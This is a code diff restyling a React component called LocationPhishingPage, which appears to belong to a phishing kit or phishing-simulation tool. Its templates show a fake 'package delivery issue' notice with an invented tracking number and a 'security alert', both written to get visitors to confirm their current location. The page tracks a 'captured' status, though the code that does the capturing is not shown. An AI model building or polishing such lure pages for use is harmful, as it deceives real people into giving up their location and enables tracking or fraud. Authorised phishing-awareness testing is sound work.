@@ -8,7 +8,7 @@ import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card'; 
-import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, type LucideIcon, Truck } from 'lucide-react';
+import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck } from 'lucide-react';
 
 interface TemplateContent {
   title: string;
@@ -16,6 +16,7 @@ interface TemplateContent {
   message: string; 
   heroIcon?: LucideIcon;
   pageSpecificMessage?: string; 
+  imageSrc?: string;
 }
 
 const templateContent: Record<string, TemplateContent> = {
@@ -23,7 +24,7 @@ const templateContent: Record<string, TemplateContent> = {
     title: 'Action Required: Package Delivery Issue',
     actionText: 'Verify Delivery Address & Reschedule',
     message: "We're having trouble delivering your package. Please verify your current location to help us resolve the issue and reschedule your delivery.",
-    pageSpecificMessage: "Our system indicates a recent delivery attempt for package **#TZ78391B** was unsuccessful. To ensure your package reaches you promptly, please confirm your current location. This will help us verify your address or allow you to select a nearby pickup point.",
+    pageSpecificMessage: "Our system indicates a recent delivery attempt for package #TZ78391B was unsuccessful. To ensure your package reaches you promptly, please confirm your current location. This will help us verify your address or allow you to select a nearby pickup point.",
     heroIcon: Truck,
   },
   'security-alert': {
@@ -140,36 +141,47 @@ export default function LocationPhishingPage() {
   const renderTemplateSpecificContent = () => {
     const HeroIcon = content.heroIcon || MapPin;
     switch (templateId) {
-      case 'package-delivery-issue':
+      case 'package-delivery-issue': {
         return (
-          <ShadcnCard className="mb-6 p-6 shadow-lg border-primary/30">
-            <CardHeader className="p-0 pb-4 text-center">
-              <HeroIcon className="w-16 h-16 text-primary mx-auto mb-3" />
-              <ShadcnCardTitle className="text-xl font-semibold text-primary">{content.title}</ShadcnCardTitle>
-            </CardHeader>
-            <CardContent className="p-0 text-center space-y-4">
-              <ShadcnCardDescription className="text-md text-muted-foreground">{content.message}</ShadcnCardDescription>
-              
-              <ShadcnCard className="bg-muted/50 p-4 rounded-md border text-left">
-                <ShadcnCardTitle className="text-md font-medium mb-2 text-foreground">Package Details:</ShadcnCardTitle>
-                <p className="text-sm"><strong>Tracking Number:</strong> TZ78391B</p>
-                <p className="text-sm"><strong>Status:</strong> <span className="text-destructive font-semibold">Delivery Attempt Failed</span></p>
-                <p className="text-sm"><strong>Reported:</strong> {currentTime || 'Loading time...'}</p>
-              </ShadcnCard>
-              <p className="text-sm text-muted-foreground pt-2 !mt-6">{content.pageSpecificMessage}</p>
-            </CardContent>
-          </ShadcnCard>
+          <div className="space-y-6 text-center">
+            <HeroIcon className="w-16 h-16 text-primary mx-auto mb-4" />
+            <p className="text-xl text-muted-foreground leading-relaxed">
+              {content.message}
+            </p>
+            <div className="border rounded-lg p-4 sm:p-6 bg-secondary/20 space-y-3 text-left shadow-sm">
+              <h3 className="text-lg font-semibold text-foreground mb-2">Package Status Update:</h3>
+              <div className="grid grid-cols-[auto_1fr] gap-x-4 gap-y-2 text-sm sm:text-md">
+                <span className="font-medium text-muted-foreground">Tracking ID:</span>
+                <span className="text-foreground font-mono bg-muted/50 px-2 py-0.5 rounded-sm">#TZ78391B</span>
+                
+                <span className="font-medium text-muted-foreground">Status:</span>
+                <span className="font-semibold text-destructive flex items-center">
+                  <AlertTriangle className="w-4 h-4 mr-1.5 flex-shrink-0" />
+                  Delivery Attempt Failed
+                </span>
+                
+                <span className="font-medium text-muted-foreground">Last Update:</span>
+                <span className="text-foreground">{currentTime || 'Fetching time...'}</span>
+              </div>
+            </div>
+            <p className="text-md text-muted-foreground/90 pt-2">
+              {content.pageSpecificMessage}
+            </p>
+          </div>
         );
+      }
       case 'security-alert':
         return (
           <Alert variant="destructive" className="mb-6 text-left p-6 shadow-lg">
-            <div className="flex items-center mb-2">
-              <HeroIcon className="h-8 w-8 mr-3 text-destructive-foreground" />
-              <AlertTitle className="text-xl font-semibold text-destructive-foreground">{content.title}</AlertTitle>
+            <div className="flex items-start mb-3"> {/* items-start for better alignment with multi-line text */}
+              <HeroIcon className="h-10 w-10 mr-4 text-destructive-foreground flex-shrink-0 mt-1" /> {/* Larger icon, margin, alignment */}
+              <div>
+                <AlertTitle className="text-2xl font-bold text-destructive-foreground mb-1">{content.title}</AlertTitle> {/* Bolder, larger */}
+                <AlertDescription className="text-md text-destructive-foreground/90 leading-relaxed"> {/* Better line height */}
+                  {content.pageSpecificMessage || content.message}
+                </AlertDescription>
+              </div>
             </div>
-            <AlertDescription className="text-md text-destructive-foreground/90">
-              {content.pageSpecificMessage || content.message}
-            </AlertDescription>
           </Alert>
         );
       case 'content-unlock':
@@ -194,7 +206,7 @@ export default function LocationPhishingPage() {
 
   return (
     <PhishingPageLayout 
-        title={templateId === 'package-delivery-issue' ? '' : content.title} 
+        title={content.title} 
         isLoading={isLoading && status !== 'captured'}
         error={error}
         statusMessage={statusMessage}
@@ -243,4 +255,4 @@ export default function LocationPhishingPage() {
     </PhishingPageLayout>
   );
 }
-
+    
